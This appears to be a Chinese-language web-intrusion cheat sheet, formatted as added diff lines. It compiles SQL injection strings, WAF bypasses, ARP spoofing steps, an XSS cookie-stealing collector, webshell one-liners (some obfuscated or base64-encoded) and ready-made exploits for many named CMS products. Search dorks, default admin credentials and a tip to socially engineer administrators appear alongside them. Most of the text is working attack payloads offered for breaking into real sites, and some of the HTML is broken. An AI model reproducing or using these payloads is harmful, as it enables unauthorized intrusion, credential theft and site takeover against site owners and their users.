+<p>接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”)), 例如：password</p>
+<p>下面开始猜字段数跟字段内容了，提交代码:javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2 union select 1,2,3,4,5,6 from 表段”));</p>
+<p>一直猜解到对为止，这里只是猜到6，记得继续加减！猜解到对的时候，页面会出现数字，然后在相对应的数字替换字段名，再进行提交代码！</p>
+<p>这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）</p>
+<p>==========================================================================================================================</p>
+<p>【 伪静态注入 】</p>
+<p>伪静态网站注入方法，通常情况下，动态脚本的网站的url类似下面这样：</p>
+<p><a href="http://www.91ri.org/news.php?id=111" target="_blank" rel="noopener">http://www.91ri.org/news.php?id=111</a></p>
+<p>做了伪静态之后就成这样了：</p>
+<p><a href="http://www.91ri.org/news.php/id/111.html" target="_blank" rel="noopener">http://www.91ri.org/news.php/id/111.html</a></p>
+<p>以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了。</p>
+<p>常规的伪静态页面如下：<a href="http://www.XXX.com/play/Diablo.html" target="_blank" rel="noopener">http://www.XXX.com/play/Diablo.html</a></p>
+<p>例如关联的动态页面是game.php ，那么当用户访问后程序会自动转换成类似<a href="http://www.XXX.com/game.php?action=play&amp;name=Diablo" target="_blank" rel="noopener">http://www.XXX.com/game.php?action=play&amp;name=Diablo</a> 的形式</p>
+<p>注入点检测可以用：<a href="http://www.XXX.com/play/Diablo’" target="_blank" rel="noopener">http://www.XXX.com/play/Diablo’</a> and 1=’1.html与<a href="http://www.XXX.com/play/Diablo’" target="_blank" rel="noopener">http://www.XXX.com/play/Diablo’</a> and 1=’2.html来判断</p>
+<p>通常情况下，动态脚本的网站的url类似下面这样：<a href="http://www.xxoo.net/aa.php?id=123" target="_blank" rel="noopener">http://www.xxoo.net/aa.php?id=123</a></p>
+<p>做了伪静态之后类似这样：<a href="http://www.xxoo.net/aa.php/id/123.html" target="_blank" rel="noopener">http://www.xxoo.net/aa.php/id/123.html</a> 以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了！</p>
+<p>==========================================================================================================================</p>
+<p>【 嗅探 】</p>
+<p>当入侵一个网站，该网站没有任何漏洞的情况下，可以进行旁注，再提权拿下任意一台服务器，不行的话就C段，提权拿下任意一台服务器。</p>
+<p>只要能拿下同网段的任意一台服务器，就可以使用C段嗅探来获取主站的帐号密码，cain是一款强大的劫持工具。</p>
+<p>在服务器里安装cain后打开主控端，点击配置-&gt;选择服务器IP一项-&gt;在路由追踪一项取消全部-&gt;确定。</p>
+<p>设置完毕后点击一下激动按钮(中间那个)，再点击嗅探器，点击加号符号，选择所有在子网主机，选择ARP测试(传播 31-位)，确定。</p>
+<p>扫描完毕选择网关一项，点击ARP，点击加号符号，左边选择网关，右边选择全部的C段，确定，点击开始嗅探按钮(第三个)，嗅探到的帐号密码在口令一项展现！</p>
+<p>如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。</p>
+<p>==========================================================================================================================</p>
+<p>【 arp欺骗 】</p>
+<p>只要该服务器存在C段，都可以尝试arp欺骗，用到的工具是NetFuke，想知道arp劫持能不能成功，cmd命令：arp -a 看一下，动态的服务器IP就能成功，静态的就不能。</p>
+<p>安装完运行主控端，设置–嗅探设置–网卡选择服务器的IP–控制选项选择“启用ARP欺骗、启用过滤器、启用分析器、启用修改器、主动转发” 确定。</p>
+<p>设置–ARP欺骗–双向欺骗–来源Ip填服务器的网关–中间人IP填服务器的IP–目标IP填要欺骗的任意C段ip(用御剑扫描C段)–确定。</p>
+<p>插件管理–修改器–最后一个选项双击–在右边的HTML Body = [haha!!] 填写自己要展现的文字，点击开始即可欺骗成功！</p>
+<p>==========================================================================================================================</p>
+<p>【 突破安全狗防注入及上传 】</p>
+<p>写入webshell 写不进去，平常的一句话 也失效，用这段代码：</p>
+<p>&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt; &lt;%try{System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“admin163.net”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null,null); } catch { }%&gt;</p>
+<p>连接端用cncert的aspx一句话客户端</p>
+<p>2、IIS6.0解析漏洞遇到安全狗</p>
+<p>文件名为<a href="http://www.baicai.com/1.asp;1.jpg" target="_blank" rel="noopener">http://www.baicai.com/1.asp;1.jpg</a></p>
+<p>这样的会被IIS安全狗果断屏蔽</p>
+<p>改成如下名称,IIS6一样会解析:</p>
+<p><a href="http://www.baicai.com/;1.asp;1.jpg" target="_blank" rel="noopener">www.baicai.com/;1.asp;1.jpg</a></p>
+<p>3、安全狗的注入绕过</p>
+<p>常用的如baicai.asp?id=1 and 1=1 是会被安全狗屏蔽的。</p>
+<p>但这样就可以突破了：</p>
+<p>baicai.asp?0day5.com=%00.&amp;id=69%20 and 1=1</p>
+<p>==========================================================================================================================</p>
+<p>【 跨站xss 】</p>
+<p>在网站留言或者能输入信息的地方提交跨站代码，从而盗取管理员cookie，然后用cookie浏览器直接进入后台，将以下代码保存为asp文件，例如1.asp&lt;%</p>
+<p>thisfile=Server.MapPath(“cookie.txt”)</p>
+<p>msg=Request(“msg”)</p>
+<p>set fs=server.CreateObject(“scripting.filesystemobject”)</p>
+<p>set thisfile=fs.OpenTextFile(thisfile,8,True,0)</p>
+<p>thisfile.WriteLine(“=======cookie:”&amp;msg&amp;”======by:剑眉大侠”)</p>
+<p>thisfile.close</p>
+<p>set fs=nothing</p>
+<p>%&gt;</p>
+<p>首先搭建一个asp环境，推荐使用“ASP服务器（摆脱安装IIS）” 再将1.asp放在wwwroot目录下，访问1.asp文件如果提示下载，则说明搭建成功了。</p>
+<p>然后在留言板的“您的网站”一处输入：<script>doucument.location=’<a href="http://127.0.0.1/1.asp?msg=’document.cookie">http://127.0.0.1/1.asp?msg=’document.cookie</a></script></p>
+<p>当管理员浏览我们提交的留言时，将在wwwroot目录下生成一个cookie.txt文件，这时我们只要访问cookie.txt这个文件，就能知道管理员的cookie是多少了！</p>
+<p>然后再使用桂林老兵的cookie欺骗工具或是网页源代码查看分析器，访问网站再输入cookie进行欺骗登录即可！（填cookei的时候记得选择自定义）</p>
+<p>小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。</p>
+<p>==========================================================================================================================</p>
+<p>【 爆库 】</p>
+<p>%5C为十六进制的\符号，而数据库大于5.0就可以爆库，若一个网站数据库大于5.0，且是ACESS数据库，若不能注入的注入点是：<a href="http://www.xxx.com/rpc/show24.asp?id=127" target="_blank" rel="noopener">http://www.xxx.com/rpc/show24.asp?id=127</a></p>
+<p>我们直接把%5C加到rpc后面，因为%5C是爆二级目录，所以应该是这样，<a href="http://www.xxx.com/rpc%5c/show24.asp?id=127" target="_blank" rel="noopener">http://www.xxx.com/rpc%5c/show24.asp?id=127</a></p>
+<p>而%23是代表#，如果管理员为了防止他人非法下载数据库，而把数据库改成#database.mdb,这样防止了。</p>
+<p>如果页面地址为：<a href="http://www.xx.com/rpd/#database.mdb" target="_blank" rel="noopener">http://www.xx.com/rpd/#database.mdb</a> ; 把%23替换#就可以下载了，即：<a href="http://www.xx.com/rpd/%23database.mdb" target="_blank" rel="noopener">http://www.xx.com/rpd/%23database.mdb</a></p>
+<p>还有利用默认的数据库路径 <a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com/</a> 后面加上 conn.asp 如果没有修改默认的数据库路径，也可以得到数据库的路径（注意：这里的/也要换成%5c）</p>
+<p>如果你能看到：’E:/ahttc040901/otherweb/dz/database/iXuEr_Studio.asa’不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。</p>
+<p>这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行.</p>
+<p>==========================================================================================================================</p>
+<p>【 利用sql注入点判断网站和数据库是否站库分离 】</p>
+<p>在注入点后加上：and exists(select * from admin where 1=(Select (case when host_name()=@@servername then 1 else 0 end)))</p>
+<p>注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。</p>
+<p>==========================================================================================================================</p>
+<p>【 iis6.0 PUT写入漏洞 】</p>
+<p>利用工具：IIS PUT Scaner、桂林老兵IIS写权限利用程序</p>
+<p>1、IIS来宾用户对网站文件夹有写入权限</p>
+<p>2、web服务器扩展力设置webDAV为允许，即：WebDAV—打勾</p>
+<p>3、网站主目录:写入—打勾(可PUT)</p>
+<p>4、网站主目录:脚本资源访问—打勾（可COPY、MOVE）</p>
+<p>大家都清楚，写权限就是允许PUT，与网站自身运行的权限无丝毫联系，如果开启了，就是没有一点安全意识，就给我们提供了大大的方便。</p>
+<p>首先用御剑工具扫下C段，比如：12.12.12.1 – 12.12.12.255 打开IIS PUT Scaner，把12.12.12.1放在Start IP 这里，12.12.12.255放在End IP 这里，</p>
+<p>接着在Port这里，换成80，点击Scan开始嗅探，当PUT这里显示是Yes就说明存在漏洞，可以右键选择PUT file，输入文件名1.txt，下面填内容，保存就可以写入了。</p>
+<p>或是利用“桂林老兵IIS写权限利用程序”也可以，这款工具比较强大，把域名填写进去，例如：<a href="http://www.xxx.com，然后在请求文件那里输入你的文件名，" target="_blank" rel="noopener">www.xxx.com，然后在请求文件那里输入你的文件名，</a></p>
+<p>在数据包格式那里选择PUT，有的会直接弹出浏览文件框，没有就自己选择，在下面，然后点击提交数据库即可，一般是先PUT一个txt文件，再MOVE成asp木马。</p>
+<p>直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。</p>
+<p>==========================================================================================================================</p>
+<p>【 ACCESS执行SQL语句导出一句话拿webshell 】</p>
+<p>原理大致和php网站的outfile差不多，在access后台其他方法不能拿到webshell，但是后台有SQL语句查询执行，就可以直接access导出一句话拿webshell了。不过需要知道物理路径才能导出，利用IIS的解析漏洞导出EXCEL文件拿到webshell，因为ACCESS数据库不允许导出其他危险格式，我们导出为EXCEL后在利用IIS解析漏洞就可以变成我们的木马了。</p>
+<p>点“服务器信息探测”，获得网站路径：e:\web\webshellcc\的EXCEL 点“系统管理”-》“自定义执行SQL”，试一下，能够执行的话可以用access导一句话拿下shell。</p>
+<p>create table cmd (a varchar(50)) 建立一个有一个A字段的表 表名为cmd 字段类型为字符 长度为50</p>
+<p>insert into cmd (a) values (‘&lt;%execute request(chr(35))%&gt;’) 在表cmd的a字段插入密码为#的一句话木马</p>
+<p>select * into [a] in ‘e:\web\webshellcc\1.asa;x.xls’ ‘excel 4.0;’ from cmd 把cmd表a的内容导出到路径e:\web\webshellcc\的EXCEL文件</p>
+<p>drop table cmd 删除建立的cmd表</p>
+<p>菜刀连接：<a href="http://www.xxx.com/1.asa;x.xls" target="_blank" rel="noopener">http://www.xxx.com/1.asa;x.xls</a></p>
+<p>==========================================================================================================================</p>
+<p>【 利用过滤’or’=’or’修改代码进行绕过 】</p>
+<p>例如后台地址是：<a href="http://www.hdminc.net/admin/admin_index.asp" target="_blank" rel="noopener">http://www.hdminc.net/admin/admin_index.asp</a></p>
+<p>当用万能密码登录的时候，会出现一些过滤or的提示！</p>
+<p>请右键查看源文件，另存为桌面 XX.html，然后打开找到以下这段代码，进行删除！</p>
+<script language="”javascript”">
+
+function chencklogin()
+
+{
+
+if(document.login.username.value==”)
+
+{alert(‘请输入用户名’);
+
+document.login.username.focus();
+
+return false
+
+}
+
+if (document.login.password.value==”)
+
+{alert(‘请输入密码’);
+
+document.login.password.focus();
+
+return false
+
+}
+
+}
+
+</script>
+
+<p>注意：将以下段代码中的 “index.asp?action=chkadmin” 修改为 “<a href="http://www.hdminc.net/admin/admin_index.asp”" target="_blank" rel="noopener">http://www.hdminc.net/admin/admin_index.asp”</a></p>
+<form action="”index.asp?action=chkadmin”" name="”login”" method="”past”" onsubmit="return" checklogin();”=""><br><br>最后保存打开，再用’or’=’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！<br><br>==========================================================================================================================<br><br>【 动力3.5拿shell 】<br><br>inurl:printpage.asp?ArticleID=<br><br>1.找到版权信息，把内容替换成：<br><br>版权所有 Copyright? 2003 &lt;a href=’<a href="http://www.asp163.net’&gt;动力空间" target="_blank" rel="noopener">http://www.asp163.net’&gt;动力空间</a>” ‘版权信息<br>if Request(“xiaoxin”)=”520″ then<br>dim allen,creat,text,thisline,path<br>if Request(“creat”)=”yes” then<br>Set fs = CreateObject(“Scripting.FileSystemObject”)<br>Set outfile=fs.CreateTextFile(server.mappath(Request(“path”)))<br>outfile.WriteLine Request(“text”)<br>Response.write “小新恭喜”<br>end if<br>Response.write “&lt;form method=’POST’action=’”&amp;Request.ServerVariables(“URL”)&amp;”?xiaoxin=520&amp;creat=yes’&gt;”<br>Response.write “<textarea name="’text’">”&amp;thisline&amp;”</textarea><br>”<br>Response.write “&lt;input type=’text’ name=’path’ value=’”&amp;Request(“path”)&amp;”‘&gt;”<br>Response.write “<input name="’submit’" type="’submit’" value="’ok’"></form>”<br>Response.end<br>end if<br>%&gt;<br><br>2.然后保存，千万别跳转任何页面，直接在IE地址栏内将 admin/Admin_Login.asp 替换成 inc/config.asp?xiaoxin=520<br><br>3.成功后会进入一个像小马一样的页面，粘贴木马代码以及写上木马文件名即可拿到wshell，木马在inc目录。<br><br>==========================================================================================================================<br><br>【 aspcms】<br><br>简要描述：后台文件AspCms_AboutEdit.asp 未进行验证，且未过滤，导致SQL注入。<br><br>爆帐号密码：<br><br>admin/_content/_About/AspCms_AboutEdit.asp?id=1 and 1=2 union select 1,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 from aspcms_user where userid=1<br><br>版本不同需要更改值。<br><br>第二种方法，找到后台，然后/admin/_system/AspCms_SiteSetting.asp?action=saves<br><br>直接POST<br><br>[php]runMode=1&amp;siteMode=1&amp;siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&amp;SwitchComments=1&amp;SwitchCommentsStatus=1&amp;switchFaq=0:Y=request(chr(35)):execute(Y)&amp;SwitchFaqStatus=0&amp;dirtyStr=&amp;waterMark=1&amp;waterMarkFont=hahahaha&amp;waterMarkLocation=1&amp;smtp_usermail=aspcmstest%40163.com&amp;smtp_user=aspcmstest&amp;smtp_password=aspcms.cn<br>&amp;smtp_server=smtp.163.com&amp;MessageAlertsEmail=13322712%40qq.com&amp;messageReminded=1&amp;orderReminded=1&amp;applyReminded=1&amp;commentReminded=1<br>&amp;LanguageID=1[/php]<br>再连接配置文件config.asp 密码为#<br>老版本中可以通过添加模板直接添加asp.但是新版已经限制了添加模板的格式为html,js,css<br><br>当然如果是遇到iis6的话还是可以通过iis6的解析漏洞把文件名改成1.asp;.html这样的格式来拿到shell的.<br><br>方法：点击“界面风格”，然后选“编辑模板/CSS文件”，然后“添加模板”，文件名称写error.asp;.html，文件内容写一句话&lt;%eval request(“g”)%&gt;<br><br>然后添加，会提示添加成功，然后在模板列表中就可以找到我们添加的一句话了，用菜刀连接即可！<br><br>可是如果遇到iis7.5呢? 以下是本人自己找到挖掘到的aspcms通杀版本的后台拿shell方法.<br><br>1、进入后台，“扩展功能”–“幻灯片设置”–”幻灯样式”<br><br>2、使用chorme的审查元素功能或者firefox的firebug，总之使用能修改当前页面元素的工具就好了，将对应的slidestyle的value的值修改为1%&gt;&lt;%Eval(Request (chr(65)))%&gt;&lt;%<br><br>3、一句话木马，密码a。在/config/AspCms_Config.asp<br><br>==========================================================================================================================<br><br>【 XYCMS企业建站系统 】<br><br>关键词：inurl:showkbxx.asp?id=<br><br>默认数据库：data/xy#!123.mdb<br><br>默认账户密码：admin admin<br><br>找到网站配置，在网站名称里面直接插入一句话：网站”%&gt;&lt;%eval request(“x”)%&gt;&lt;%’，注意不要删掉网站名称！然后中国菜刀连接：/inc/config.asp<br><br>【 szwyadmin漏洞绕过后台验证 】<br><br>关键字:inurl:szwyadmin/login.asp<br><br>javascript:alert(document.cookie=”adminuser=”+escape(“‘or’=’or’”));javascript:alert(document.cookie=”adminpass=”+escape(“‘or’=’or’”));javascript:alert(document.cookie=”admindj=”+escape(“1″));<br><br>1.后台一般存在一个szwyadmin文件夹，复制一下后台地址放在一边，之后复制代码替换后台地址访问进行注射！<br><br>2.这时会弹出一个窗口，连续点击三次确定。<br><br>3.重新访问后台地址，把网站后面的/login.asp 换成 admin_index.asp 奇迹般的直接进入后台了！<br><br>==========================================================================================================================<br><br>【 医院建站系统任意文件上传漏洞 】<br><br>关键词：inurl:cms/Column.aspx?<br><br>关键词：inurl:cms/Column.aspx?LMID=<br><br>漏洞利用 ：xtwh/upfile.aspx<br><br>直接上传aspx木马拿shell。<br><br>==========================================================================================================================<br><br>【 嘉友科技cms上传漏洞 】<br><br>谷歌关键字：inurl:newslist.asp?NodeCode=<br><br>程序采用的上传页uploadfile.asp未进行管理验证，导致建立畸形目录上传图片木马获取shell漏洞。<br><br>exp：ploadfile.asp?uppath=mad.asp&amp;upname=&amp;uptext=form1.mad.asp他原上传目录是:uploadfile.asp?uppath=PicPath&amp;upname=&amp;uptext=form1.PicPath<br><br>而且他的上传文件没有过滤导致未授权访问，直接上传小马，然后小马后面写为1.jpg 访问路径 查看源代码。<br>==========================================================================================================================<br><br>【 ecshopcms后台拿shell 】<br><br>支持最新2.7.2版本，通杀最新版本后台低权限！<br><br>&lt;?php $filen=chr(46).chr(46).chr(47).chr(110).chr(117).chr(108).chr(108).chr(46).chr(112).chr(104).chr(112); $filec=chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(117).chr(115).chr(98).chr(93).chr(41).chr(59).chr(63).chr(62); $a=chr(119); $fp=@fopen($filen,$a); $msg=@fwrite($fp,$filec); if($msg) echo chr(79).chr(75).chr(33); @fclose($fp); ?&gt;<br><br>后台-订单管理-订单打印-选择源代码编辑-保存-返回订单列表，随意选择一个订单打印，返回OK，生成一句话成功-在根目录生成了一个null.php，一句话密码：usb<br><br>==========================================================================================================================<br><br>【 教育站sql注入通杀0day 】<br><br>关键词：inurl:info_Print.asp?ArticleID=<br><br>默认后台：<a href="http://www.xx.com/ad_login.asp" target="_blank" rel="noopener">www.xx.com/ad_login.asp</a><br><br>比如：<a href="http://www.xx.com/info_Print.asp?ArticleID=539" target="_blank" rel="noopener">http://www.xx.com/info_Print.asp?ArticleID=539</a><br>加上：union select 1,2,username,password,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from admin<br><br>这样就直接得到了管理员账户和经过Md5加密的密码了。<br><br>==========================================================================================================================<br><br>【 IIS7.0 畸形解析漏洞通杀oday 】<br><br>找到某个使用IIS7.0架设的站，然后找到其中的图片上传点（不需要管理权限，普通注册用户即可搞定），把PHP一句话图片木马缀改成.jpg，传上去，得到图片地址。<br><br>在图片格式后面添加xx.php xx随便你怎么填，只要后缀为.php就好，之后菜刀连接即可！<br><br>==========================================================================================================================<br><br>【 Yothcms 遍历目录漏洞 】<br><br>优斯科技企业网站管理系统(YothCMS)是一款完全开源免费的CMS。<br><br>默认后台：admin/login.asp<br><br>遍历目录：ewebeditor/manage/upload.asp?id=1&amp;dir=../<br><br>数据库路径：%23da%23ta%23\%23db_%23data%23%23.asa<br><br>==========================================================================================================================<br><br>【 传信网络独立开发网站源码0day漏洞 】<br><br>默认后台：system/login.asp<br><br>编辑器后台路径：ubbcode/admin_login.asp<br><br>数据库路径：ubbcode/db/ewebeditor.mdb<br><br>默认账号密码：yzm 111111<br><br>==========================================================================================================================<br><br>【 科讯cms 6.5后台拿shell 】<br><br>1.可以在数据库备份中找到网站的绝对路径<br><br>2.利用科讯SQL注入漏洞利用工具也能找到进入后台后执行sql命令：<br><br>create table E:\wenxiushi\wz001\KS_Data\Collect\KS_Collect.Mdb.cmd (a varchar(50))<br><br>insert into E:\wenxiushi\wz001\KS_Data\Collect\KS_Collect.Mdb.cmd (a) values (‘┼攠數畣整爠煥敵瑳∨∣┩愾’)<br><br>接着数据库备份成1.asp 菜刀连接密码：#<br><br>==========================================================================================================================<br><br>【 动易2006后台拿shell 】<br><br>进入后台后，我们在左边菜单栏中选择“系统设置”，然后在出现的菜单栏里选择“自定义页面管理”，<br><br>接着需要先添加一个自定义页面分类，选择“添加自定义分类”这个选项，分类名称与分类简介都可以随便填写。填写完毕后选择“添加”，系统提示添加成功。<br><br>下面再来选择“添加自定义页面”，“页面名称”随便输入，“所属分类”就是刚才建立的分类就可以了。“页面类型”和“页面路径”都不用管，保持默认.<br><br>不过如果没有改页面路径的话，默认生成的文件是在根目录下的，也就是<a href="http://www.xx.com/maer.asp.“文件名称”即输入生成的木马的文件名。" target="_blank" rel="noopener">http://www.xx.com/maer.asp.“文件名称”即输入生成的木马的文件名。</a><br><br>“页面简介”也不用管，下面就是页面内容了。这里填入小马的代码。一切完毕点击“添加”会提示保存自定义页面成功。最后一步是要生成我们的木马页面。<br><br>选择“自定义页面管理首页”，点击右边出现的“生成本页”就OK 了，成功获得动易的shell。<br><br>==========================================================================================================================<br><br>【 Shopex4.8.5 注入漏洞后台拿shell 】<br><br>关键词：powered by shopex v4.8.5<br><br>exp:<br><br><html><br><br><head><br><br><title>Shopex 4.8.5 SQL Injection Exp</title><br><br></head><br><br><body><br><br><h2>Shopex 4.8.5 SQL Injection Exp (product-gnotify)</h2><br><br>&lt;form action=”<a href="http://www.lpboke.com/?product-gnotify”" target="_blank" rel="noopener">http://www.lpboke.com/?product-gnotify”</a> method=”post” name=”submit_url”&gt;<br><br><input type="”hidden”" name="”goods[goods_id]”" value="”3″"><br><br><input 1="2" type="”hidden”" name="”goods[product_id]”" value="”1" and="" union="" select="" 1,2,3,4,5,6,7,8,concat(0x245e,username,0x2d3e,userpass,0x5e24),10,11,12,13,14,15,16,17,18,19,20,21,22="" from="" sdb_operators”=""><br><br><input type="”submit”" value="””"><br><br>
+
+<p>fuck</p>
+<body>
+
+<p></p></body></body></html><p></p>
+<p>保存为html格式，替换代码中的网站，本地打开后点击小图标，出现新页面，帐号密码爆出来了，默认后台：shopadmin</p>
+<p>拿shell方法….</p>
+<p>第一步 页面管理 修改模版 然后选一个XML编辑</p>
+<p>开始用 live http 抓包 你们懂的 然后把第一个POST包给抓出来</p>
+<p>然后改包 id=1273923028-info.xml&amp;tmpid=1273923028&amp;name=index_temp.php&amp;file_source=</p>
+<p>解释一下 id是你选择的模版文件夹名称 后面的info.xml 是你修改的XML文件 tmpid= 你们懂的 就是模版文件夹 然后 name 是你提交的文件名字 file_source 是后门或者shel</p>
+<p>我这里是一句话 你们懂的 然后提交了之后 地址是这样的<a href="http://Madman.in/themes/文件名称/你的木马名称" target="_blank" rel="noopener">http://Madman.in/themes/文件名称/你的木马名称</a><br>—————————————————————————————————————————————————————-</p>
+<p>【 ecshop漏洞总汇 】</p>
+<p>关键字：powered by ecshop普通代码：user.php?act=order_query&amp;order_sn=’ union select 1，2，3，4，5，6，concat(user_name，0x7c，password，0x7c，email)，8 from ecs_admin_user/*</p>
+<p>变种代码：search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319<br>直接在网站后台加入代码回车就能爆出帐号密码，再去掉代码加上/admin回车就能直接进后台了。拿shell方法很简单，找到“库项目管理”再选择“配送的方式”，在代码最下面插入php一句话木马：&lt;?php eval($_POST[x]);?&gt; 不行就换php木马的预代码！</p>
+<p>接着保存，一句话路径是：<a href="http://www.xxx.org/myship.php" target="_blank" rel="noopener">http://www.xxx.org/myship.php</a> ; 打开“ASP+PHP两用Shell.html”填入地址，点击一下环境变量，成功之后点击上传文件就可以拿shell了。<br>—————————————————————————————————————————————————————-<br>【 帝国cms 6.6最新版本 】</p>
+<p>自定义页面-增加自定义页面-随便写个.php文件名，内容写：<script language="”php”">echo base64_decode(“PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=”);</script></p>
+<p>如果内容直接添一句话或者php大马是无用的，因为他会生成xxx.php前先给你执行，</p>
+<p>PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4= 就是 &lt;?php @eval($_POST[‘cmd’]);?&gt; 的base64加密。</p>
+<p>所以生成xxx.php后 会出现内容 &lt;?php @eval($_POST[‘cmd’]);?&gt; 在文件里，然后用菜刀直接连接吧。</p>
+<p>—————————————————————————————————————————————————————-</p>
+<p>【 phpweb 】</p>
+<p>关键字：inurl:down/class/index.php?myord=</p>
+<p>后台地址：admin.php</p>
+<p>万能密码：admin ‘or ‘1’=’1</p>
+<p>注入地址：down/class/index.php?myord=1</p>
+<p>表段：pwn_base_admin</p>
+<p>拿shell通杀漏洞：登入后台–文章–文章发布–文章内容里的图片上传按钮–抓包之后改包NC提交。</p>
+<p>也可以用下面的exp拿shell：</p>
+<p>用火狐浏览器登录后台，因为火狐浏览器有保留cookies的功能， 找到“phpweb之exp”这个html，拉进火狐浏览器器里上传1.php;.jpg的一句话木马，查看源码菜刀连接！</p>
+<p>—————————————————————————————————————————————————————-</p>
+<p>动科(dkcms)漏洞:</p>
+<p>官方网站：<a href="http://www.dkcms.com主要是差不多3个版本为主吧，" target="_blank" rel="noopener">www.dkcms.com主要是差不多3个版本为主吧，</a></p>
+<p>V2.0 data/dkcm_ssdfhwejkfs.mdb<br>V3.1 _data/___dkcms_30_free.mdb<br>V4.2 _data/I^(()UU()H.mdb<br>默认后台：admin<br>编辑器：admin/fckeditor<br>后台拿shell，fck编辑器突破可拿shell<br>建立asp文件夹<br>Fck的路径：Admin/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/mk.asp&amp;NewFolderName=mk.asp</p>
+<p>—————————————————————————————————————————————————————-</p>
+<p>ESPCMS通杀0day :</p>
+<p>关键字：inurl:index.php?ac=article&amp;at=read&amp;did=</p>
+<p>默认后台：adminsoft/index.php siteadmin/index.php</p>
+<p>注入点(爆表前缀)：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,table_name,0x27,0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
+<p>爆帐号：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,username,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
+<p>爆密码：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,password,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
+<p>帐号和密码一次性爆：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,username,0x27,password)) from 前缀_admin_member limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
+<p>进到后台后，直接点击分类图片-修改-选择文件-直接上传php一句话木马</p>
+<p>PS：当上传不了php木马时，去系统设置一下，添加图片上传格式 |php ，这样就可以上传一个图片文件头的php木马。</p>
+<p>—————————————————————————————————————————————————————-</p>
+<p>Thinkphp框架任意代码执行漏洞 :</p>
+<p>ThinkPHP是一款国内使用比较广泛的老牌PHP MVC框架</p>
+<p>关键字：thinkphp intitle:系统发生错误</p>
+<p>获取Thinkphp的版本号：index.php/module/action/param1/$%7B@print(THINK_VERSION)%7D</p>
+<p>获取服务器的配置信息：index.php/module/aciton/param1/${@phpinfo()}</p>
+<p>列出网站所有文件列表：index.php/module/action/param1/{${system($_GET[‘x’])}}?x=ls -al</p>
+<p>直接在网页执行一句话：index.php/module/action/param1/{${eval($_POST[s])}}</p>
+<p>菜刀连接：<a href="http://www.xxx.com/index.php/module/action/param1/{${eval($_POST[s])}}" target="_blank" rel="noopener">http://www.xxx.com/index.php/module/action/param1/{${eval($_POST[s])}}</a> 密码：s</p>
+<p>—————————————————————————————————————————————————————-</p>
+<p>良精系统 :</p>
+<p>( 爆管理员帐号密码的代码 )</p>
+<p>NewsType.asp?SmallClass=’%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20”=’</p>
+<p>（ 一句话木马的妙用 ）</p>
+<p>插入一句话木马后，连接网站的配置文件：inc/config.asp 密码都是g</p>
+<p>1.网站配置-允许的上传文件类型-插入闭合的一句话木马：”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 不行就增加一个cer格式，之后上传cer格式的木马即可</p>
+<p>2.网站配置-网站地址-插入闭合的一句话木马：http://”%&gt;&lt;%execute(request(“g”))%&gt;&lt;%’</p>
+<p>3.网站配置-网站名称-插入闭合的一句话木马：沧州临港彩越化工有限公司”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=”</p>
+<p>4.网站配置-版权信息-插入闭合的一句话木马：”%&gt;&lt;%eval(request(chr(103)))%&gt;&lt;%’</p>
